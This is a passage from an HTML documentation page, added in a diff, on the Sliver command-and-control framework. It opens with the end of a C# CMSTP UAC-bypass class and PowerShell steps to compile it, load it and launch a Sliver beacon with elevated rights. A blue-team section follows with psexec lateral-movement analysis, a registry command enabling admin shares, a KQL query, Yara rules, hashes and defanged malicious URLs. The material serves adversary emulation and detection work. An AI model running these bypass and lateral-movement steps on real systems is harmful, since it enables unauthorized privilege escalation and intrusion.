+        if(target.Length == 0) return IntPtr.Zero;
+        target[0].Refresh();
+        IntPtr WindowHandle = new IntPtr();
+        WindowHandle = target[0].MainWindowHandle;
+        if(WindowHandle == IntPtr.Zero) return IntPtr.Zero;
+        SetForegroundWindow(WindowHandle);
+        ShowWindow(WindowHandle, 5);
+        return WindowHandle;
+    }
+}
+</code></pre>
+<ol>
+<li>Compile the code to .dll with the following command:</li>
+</ol>
+<pre><code>Add-Type -TypeDefinition ([IO.File]::ReadAllText(&quot;$pwd\Source.cs&quot;)) -ReferencedAssemblies &quot;System.Windows.Forms&quot; -OutputAssembly &quot;CMSTP-UAC-Bypass.dll&quot;
+</code></pre>
+<p><img alt="" src="../images/privilege-escalation/1-compile-dll.PNG" /></p>
+<ol>
+<li>Read the class in the CMSTP-UAC-Bypass.dll file to the variable: </li>
+</ol>
+<pre><code>[Reflection.Assembly]::Load([IO.File]::ReadAllBytes(&quot;$pwd\CMSTP-UAC-Bypass.dll&quot;))
+</code></pre>
+<p><img alt="" src="../images/privilege-escalation/7-read-variable.PNG" />
+The class will then be accessible and can be used within the script. </p>
+<ol>
+<li>The <code>Execute</code> method is used to run the Sliver beacon and write a payload file into the temp directory. </li>
+</ol>
+<pre><code>[CMSTPBypass]::Execute(&quot;C:\to\beacon\location\caddy_beacon.exe&quot;)
+</code></pre>
+<p><img alt="uac" src="../images/privilege-escalation/3-uac-bypass-execution.png" /></p>
+<p>This will initialise a high integrity cmd.exe popup on the target machine.</p>
+<ol>
+<li>The command <code>getsystem</code> can now be used in Sliver to start a new system session. </li>
+</ol>
+<p><img alt="getsystem" src="../images/privilege-escalation/5-getsystem.PNG" /></p>
+<ol>
+<li>The command <code>beacon</code> displays active beacons. The system account is selected with the <code>use [PID]</code> command. </li>
+</ol>
+<p><img alt="admin beacon" src="../images/privilege-escalation/6-admin-beacons.PNG" /></p>
+<h1 id="for-blue-teams">For blue teams</h1>
+<h2 id="threat-hunting">Threat hunting</h2>
+<p>A multilayered approach to security is required to safeguard operation security. This should include the use of endpoint detection and response (EDR) tools, network traffic analysis, and file system monitoring.</p>
+<h2 id="lateral-movement">Lateral movement</h2>
+<h3 id="remote-process-execution">Remote process execution</h3>
+<p>It is not always feasible to fingerprint the command-and-control (C2) communication protocol due to SSL encryption. Detecting lateral movement attempts is relatively easier, however. This can be illustrated with the <code>psexec</code> method of process execution. The attacker copies an executable (1), initiates the CreateServiceW request (2), and starts the service with the StartServiceW call (3). This method is widely used to gain unauthorized access to remote systems.</p>
+<p>During such operations the remote service name, service description, and the executable's upload location can be customized. Sliver additionally generates a random file name for each <code>psexec</code> execution. In this case it is <em>hygienicu6.exe</em>. </p>
+<p><img alt="psexec" src="../images/20-psexec.PNG" /></p>
+<p>The process does not appear in the main window of Task Manager. It is instead found under the Details tab.</p>
+<p><img alt="processes" src="../images/21-process_details.PNG" /></p>
+<p>It can also be viewed in Procmon. </p>
+<p><img alt="procmon" src="../images/22-procmon.PNG" /></p>
+<p>Administrative shares may need to be enabled in order to execute processes remotely. In some cases this requires modification of the registry. This is achieved with the following command: <code>reg add HKLM\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters /f /v AutoShareWks /t REG_DWORD /d 1</code>. </p>
+<p>Default values for the ImagePath, DisplayName, and Description of the service installed on the remote system when using Sliver’s PsExec command can be queried with the following command:</p>
+<pre><code class="language-DeviceRegistryEvents">| where ActionType == 'RegistryValueSet'
+| where (RegistryValueName == 'ImagePath' and RegistryValueData matches regex @'^[a-zA-Z]:\\windows\\temp\\[a-zA-Z0-9]{10}\.exe') or
+        (RegistryValueName == 'DisplayName' and RegistryValueData == 'Sliver') or 
+        (RegistryValueName == 'Description' and RegistryValueData == 'Sliver implant')
+</code></pre>
+<p>When building a robust detection signature of a lateral movement technique it is important to rely on a sequence of events that don’t change, rather than detecting specific strings or binary sequences in the network traffic (e.g., the default service name “Sliver”, or the default target directory “Windows\Temp”). </p>
+<h3 id="network-traffic-analysis">Network Traffic Analysis</h3>
+<p>It is also possible to identify certain patterns and signatures associated with Sliver. Sliver's unique encryption algorithm can be detected through network traffic monitoring.</p>
+<p>Sliver use DNS, mTLs, WireGuard and HTTP(S) for callback protocols. All traffic is encrypted. Additional encoding can be used for further obfuscation. </p>
+<p>Lateral movement from Sliver is reasonably easy to detect in Wireshark. DNS traffic is of particular relevance to blue teams. The Sliver implant encodes its messages into subdomain requests and responses. The data is packaged and encoded in such a way as to maximize the amount of data sent in any single request.   </p>
+<p><img alt="Wireshark" src="../images/23-wireshark-dns.png" /></p>
+<p>Encoded and encrypted payload data is limited to 254 characters per subdomain. There is a limited character count per request. C2 servers using DNS generate traffic significant orders of magnitude higher than protocols such as HTTP. This makes DNS logs a logical place to look for Sliver traces. This can be achieved by looking for subdomains with an excessive domain count or a large number of bytes per request. </p>
+<h2 id="monitoring">Monitoring</h2>
+<h3 id="yara">Yara</h3>
+<p>Specific IP addresses, domain names, and ports used by C2 traffic can also be monitored. Daniel Roberson's <a href="https://dmfrsecurity.com/2022/01/24/100-days-of-yara-day-36-sliver-adversary-emulation-framework/">Yara rule</a> is an example of a useful tool in this context.</p>
+<pre><code>rule sliver_client : c2 implant
+{
+    meta:
+        description = &quot;Bishop Fox's Sliver C2 Implant&quot;
+        author = &quot;Daniel Roberson&quot;
+        url = &quot;https://github.com/BishopFox/sliver&quot;
+
+    strings:
+        $s1 = &quot;github.com/bishopfox/sliver/client&quot;
+
+    condition:
+        all of them and filesize &lt; 50MB
+}
+
+rule sliver_server : c2
+{
+    meta:
+        description = &quot;Bishop Fox's Sliver C2 Server&quot;
+        author = &quot;Daniel Roberson&quot;
+        url = &quot;https://github.com/BishopFox/sliver&quot;
+
+    strings:
+        $s1 = &quot;RunSliver&quot;
+
+    condition:
+        all of them and filesize &gt; 50MB
+}
+</code></pre>
+<h3 id="file-system-monitoring">File System Monitoring</h3>
+<p>This method involves monitoring the file system for executable files associated with Sliver and its Indicators of Compromise (IoCs). Organizations can detect the presence of Sliver C2 by monitoring these files and tracking changes to critical system files like the Windows registry. <a href="Malware Bazaar">https://bazaar.abuse.ch/browse/signature/Sliver/</a> provides an updated list of IoCs to aid in this process.</p>
+<table>
+<thead>
+<tr>
+<th>First seen</th>
+<th>SHA256</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2023-01-05 19:38:07</td>
+<td>3221de492e436a79655b4a82b72830a28de3aa417300fdf06e0b28202053ff3e</td>
+</tr>
+<tr>
+<td>2023-01-05 19:37:00</td>
+<td>1846c1db07d4f9a3a86605e38c0be5da38074b91cfafa1a72bccc693b06346e4</td>
+</tr>
+<tr>
+<td>2022-12-16 19:20:46</td>
+<td>f63993a7e4dc3e4242509482ca4d9ee1cbd4c00d219503ecf5d139d763a42f35</td>
+</tr>
+<tr>
+<td>2022-07-18 08:00:49</td>
+<td>78eb647f3d2aae5c52fcdc46ac1b27fb5a388ad39abbe614c0cfc902d223ccd6</td>
+</tr>
+<tr>
+<td>2022-07-18 08:00:44</td>
+<td>f13deec28f6f6d3f4f555f5a2db48cd8a541be52c331ccfccba929e4dfd6bc7a</td>
+</tr>
+<tr>
+<td>2022-07-18 08:00:39</td>
+<td>fa647a34b88c5409a58d2f2568147fa03112eb8bfa34bccd801830446213d7c4</td>
+</tr>
+<tr>
+<td>2022-07-18 08:00:32</td>
+<td>5568131f894caf1217f4cbda3dd40c1f39e680ce7727ed4a767cd1986e7805f0</td>
+</tr>
+<tr>
+<td>2022-07-18 08:00:26</td>
+<td>5c973707940097122ec97fcb73e7b14f054c11c7e1dd958efe933ae3c6a78c4e</td>
+</tr>
+</tbody>
+</table>
+<h3 id="endpoint-detection-and-response-edr-tools">Endpoint Detection and Response (EDR) Tools</h3>
+<p>EDR tools are specifically designed to identify and respond to threats on endpoints. They can detect Sliver activity by observing specific behaviors. This includes the execution of malicious files or the establishment of particular network connections. Network indicators provided by <a href="AlienVault">https://otx.alienvault.com/pulse/63e5d72a7086a248b9fac221</a> are potentially useful resources in this regard.</p>
+<table>
+<thead>
+<tr>
+<th>Indicator</th>
+<th>Type</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>43[.]128.62.42</td>
+<td>IPv4</td>
+</tr>
+<tr>
+<td>45[.]144.3.216</td>
+<td>IPv4</td>
+</tr>
+<tr>
+<td>hxxp://43.128.62.42/acl.exe</td>
+<td>URL</td>
+</tr>
+<tr>
+<td>hxxp://45.144.3.216/powercat.ps1</td>
+<td>URL</td>
+</tr>
+<tr>
+<td>5[.]199.173.103</td>
+<td>IPv4</td>
+</tr>
+<tr>
+<td>61[.]155.8.2</td>
+<td>IPv4</td>
+</tr>
+<tr>
+<td>hxxp://43.128.62.42:8888</td>
+<td>URL</td>
+</tr>
+<tr>
+<td>hxxp://45.144.3.216/2.ps1</td>
+<td>URL</td>
+</tr>
+<tr>
+<td>hxxp://45.144.3.216:14356</td>
+<td>URL</td>
+</tr>
+<tr>
+<td>hxxp://5.199.173.103/7za.exe</td>
+<td>URL</td>
+</tr>
+<tr>
+<td>hxxp://5.199.173.103/syse.bat</td>
+<td>URL</td>
+</tr>
+<tr>
+<td>hxxp://5.199.173.103/t.zip</td>
+<td>URL</td>
+</tr>
+</tbody>
+</table>
+<h2 id="limitations">Limitations</h2>
+<p>Sliver supports various other methods to move laterally using third-party components. Modules can be installed using the <code>armory</code> command. Sliver's alias and extension package manager can install components such as SharpWMI, allow remote process creation via WMI, ServiceMove-BOF, abuse the Windows Perception Simulation Service, and SCShell. These rely on ChangeServiceConfigA to run commands. All these methods require tailored detections because the techniques employed greatly differ. </p>
+<h1 id="sources">Sources</h1>
+<p>AlienVault. (n.d.). AlienVault Open Threat Exchange. <em>AlienVault</em>. Retrieved June 13, 2023, from https://otx.alienvault.com/pulse/63e5d72a7086a248b9fac221</p>
+<p>BishopFox. (n.d.).  Sliver: Adversary Emulation Framework. <em>GitHub</em>. Retrieved May 17, 2023, from https://github.com/BishopFox/sliver</p>
+<p>Breen, K. (2023). Detecting and decrypting Sliver C2 – a threat hunter’s guide. <em>Immersive Labs</em>. Retrieved June 13, 2023, from https://www.immersivelabs.com/blog/detecting-and-decrypting-sliver-c2-a-threat-hunters-guide/</p>
+<p>Cybereason (n.d.). Sliver C2 Leveraged by Many Threat Actors. <em>Cybereason</em>. Retrieved June 12, 2023, from https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors</p>
+<p>Seamless Intelligence. (n.d). Domain User to Domain Admin using Sliver. <em>Seamless Intelligence</em>. Retrieved May 17, 2023, from https://seamlessintelligence.com.au/sliver_2.html</p>
+<p>Marques, Z. (2018, October 31). How to bypass UAC in newer Windows versions. <em>zc00l blog</em>. Retrieved May 17, 2023, from https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html</p>
+<p>Microsoft (2023). Looking for the ‘Sliver’ lining: Hunting for emerging command-and-control frameworks. <em>Microsoft Security Blog</em>. Retrieved June 13, 2023, from  https://www.microsoft.com/en-us/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/</p>
+<p>Numen. (2023). Looking for the ‘Sliver’ lining - Getting System Shell with Sliver C2. <em>Numen</em>. Retrieved May 17, 2023, from https://www.numencyber.com/looking-for-the-sliver-lining/</p>
+<p>Roberson, D. (2021, December 31). 100 Days of YARA – Day 36: Sliver Adversary Emulation Framework. <em>DMFR SECURITY</em>. Retrieved June 13, 2023, from https://dmfrsecurity.com/2022/01/24/100-days-of-yara-day-36-sliver-adversary-emulation-framework/</p>
+              
+            </div>
+          </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="../../sigflip/sigflip/" class="btn btn-neutral float-left" title="SigLoader"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../../../3-resource-development/keepass-password-dumper/keepass/" class="btn btn-neutral float-right" title="Keepass Password Dumper">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="../../sigflip/sigflip/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../../../3-resource-development/keepass-password-dumper/keepass/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script>var base_url = '../../..';</script>
+    <script src="../../../js/theme_extra.js" defer></script>
+    <script src="../../../js/theme.js" defer></script>
+      <script src="../../../search/main.js" defer></script>
+    <script defer>
+        window.onload = function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        };
+    </script>
+
+</body>
+</html>
